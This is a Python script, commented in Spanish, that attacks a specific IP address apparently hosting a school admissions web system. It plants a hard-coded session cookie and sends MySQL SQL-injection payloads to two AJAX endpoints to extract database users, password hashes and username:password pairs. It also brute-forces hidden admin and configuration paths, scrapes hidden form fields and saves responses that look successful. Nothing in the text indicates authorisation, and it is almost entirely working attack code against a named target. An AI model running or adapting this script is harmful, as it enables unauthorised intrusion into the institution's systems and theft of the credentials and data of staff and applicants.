# targeted_exploit.py
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TargetedExploiter:
    def __init__(self):
        self.base_url = "https://189.254.143.102"
        self.session = requests.Session()
        self.session.verify = False
        self.jsessionid = "3B0DDD39CD0068BB30ED28B8C75B2A38"  # Tu sesión activa
        
    def set_session_cookie(self):
        """Configura la cookie de sesión activa"""
        self.session.cookies.set('JSESSIONID', self.jsessionid)
        print(f"[+] Sesión configurada: {self.jsessionid}")

    def test_session_access(self):
        """Verifica el acceso con la sesión actual"""
        print("[+] Verificando acceso de sesión...")
        
        test_urls = [
            "/jsp/index.jsp",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp",
            "/jsp/cerrar_sesion.jsp"
        ]
        
        for url in test_urls:
            try:
                full_url = self.base_url + url
                response = self.session.get(full_url)
                print(f"  {url} - Status: {response.status_code} - Tamaño: {len(response.text)} bytes")
                
                # Buscar información específica
                if "hnieto" in response.text:
                    print("    🔍 Referencia a 'hnieto' encontrada")
                if "Solicita Ficha de Admisión" in response.text:
                    print("    🔍 Formulario de admisión detectado")
                    
            except Exception as e:
                print(f"  ❌ Error en {url}: {e}")

    def exploit_ajax_endpoints(self):
        """Explota endpoints AJAX específicos encontrados"""
        print("\n[+] Explotando endpoints AJAX...")
        
        # Endpoints basados en tu análisis previo
        endpoints = [
            {
                "url": "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp",
                "param": "xCveBachillerato",
                "type": "sql"
            },
            {
                "url": "/jsp/escolar/muestra_bachillerato_ajax.jsp", 
                "param": "xCveBachillerato",
                "type": "sql"
            }
        ]
        
        # Payloads específicos para MySQL
        sql_payloads = [
            # Extracción de información básica
            "1 UNION SELECT user(),database(),version()--",
            "1 UNION SELECT @@version,@@hostname,@@datadir--",
            
            # Extracción de tablas
            "1 UNION SELECT table_name,table_schema,3 FROM information_schema.tables WHERE table_schema=database()--",
            
            # Extracción de usuarios de MySQL
            "1 UNION SELECT user,authentication_string,host FROM mysql.user--",
            
            # Búsqueda de credenciales en tablas comunes
            "1 UNION SELECT concat(username,':',password),'from_users_table',3 FROM users--",
            "1 UNION SELECT concat(usuario,':',contrasena),'from_usuarios_table',3 FROM usuarios--",
            
            # Prueba simple
            "1' OR '1'='1'--",
            "1' AND 1=1--"
        ]
        
        for endpoint in endpoints:
            print(f"\n  🔍 Probando: {endpoint['url']}")
            
            # Primero probar el endpoint normal
            normal_url = f"{self.base_url}{endpoint['url']}?{endpoint['param']}=1"
            response = self.session.get(normal_url)
            print(f"    Normal request: {response.status_code} - {len(response.text)} bytes")
            if response.status_code == 200:
                print(f"    Respuesta: {response.text[:100]}...")
            
            # Probar payloads SQL
            for payload in sql_payloads:
                try:
                    test_url = f"{self.base_url}{endpoint['url']}?{endpoint['param']}={payload}"
                    response = self.session.get(test_url)
                    
                    # Analizar respuesta para detectar éxito
                    if response.status_code == 200 and len(response.text) > 10:
                        # Buscar indicadores de datos inyectados
                        if any(keyword in response.text for keyword in ['root', 'localhost', 'mysql', '@']):
                            print(f"    ✅ POSIBLE ÉXITO con: {payload[:50]}...")
                            print(f"      Respuesta: {response.text}")
                            
                            # Guardar resultado prometedor
                            with open(f"sql_success_{hash(payload)}.txt", "w", encoding="utf-8") as f:
                                f.write(f"Payload: {payload}\n")
                                f.write(f"URL: {test_url}\n")
                                f.write(f"Response: {response.text}\n")
                        elif "error" not in response.text.lower():
                            print(f"    ⚠️  Respuesta diferente con: {payload[:30]}...")
                            
                except Exception as e:
                    print(f"    ❌ Error con payload: {e}")

    def discover_hidden_endpoints(self):
        """Descubre endpoints ocultos mediante fuerza bruta"""
        print("\n[+] Buscando endpoints ocultos...")
        
        common_jsp_paths = [
            "/jsp/admin/", "/jsp/config/", "/jsp/database/", "/jsp/export/",
            "/jsp/import/", "/jsp/report/", "/jsp/user/", "/jsp/system/",
            "/jsp/backup/", "/jsp/log/", "/jsp/debug/", "/jsp/test/",
            "/jsp/upload/", "/jsp/download/", "/jsp/query/", "/jsp/data/",
            "/jsp/manager/", "/jsp/settings/", "/jsp/configuration/",
            "/jsp/escolar/admin/", "/jsp/escolar/config/", "/jsp/escolar/data/"
        ]
        
        for path in common_jsp_paths:
            try:
                url = self.base_url + path
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"  ✅ Endpoint encontrado: {path}")
                    
                    # Buscar información sensible
                    content_lower = response.text.lower()
                    sensitive_keywords = [
                        'password', 'jdbc', 'mysql', 'usuario', 'contrasena',
                        'database', 'connection', 'config', 'properties'
                    ]
                    
                    for keyword in sensitive_keywords:
                        if keyword in content_lower:
                            print(f"    🔍 '{keyword}' encontrado en {path}")
                            
            except:
                pass

    def analyze_forms_and_parameters(self):
        """Analiza formularios y parámetros ocultos"""
        print("\n[+] Analizando formularios...")
        
        main_url = self.base_url + "/jsp/escolar/proceso_admision/proceso_interesado.jsp"
        response = self.session.get(main_url)
        
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Encontrar todos los formularios
            forms = soup.find_all('form')
            print(f"  📋 Formularios encontrados: {len(forms)}")
            
            for i, form in enumerate(forms):
                print(f"    Formulario {i+1}:")
                if form.get('action'):
                    print(f"      Action: {form.get('action')}")
                if form.get('method'):
                    print(f"      Method: {form.get('method')}")
                
                # Encontrar inputs ocultos
                hidden_inputs = form.find_all('input', {'type': 'hidden'})
                for input_tag in hidden_inputs:
                    name = input_tag.get('name', 'sin nombre')
                    value = input_tag.get('value', 'sin valor')
                    print(f"      🔒 Hidden: {name} = {value}")

    def run_complete_exploitation(self):
        """Ejecuta la explotación completa"""
        print("=== EXPLOTACIÓN DIRIGIDA SITO ===")
        
        # 1. Configurar sesión
        self.set_session_cookie()
        
        # 2. Verificar acceso
        self.test_session_access()
        
        # 3. Explotar endpoints AJAX
        self.exploit_ajax_endpoints()
        
        # 4. Descubrir endpoints ocultos
        self.discover_hidden_endpoints()
        
        # 5. Analizar formularios
        self.analyze_forms_and_parameters()
        
        print("\n🎯 EXPLOTACIÓN COMPLETADA!")

# Ejecutar
if __name__ == "__main__":
    exploiter = TargetedExploiter()
    exploiter.run_complete_exploitation()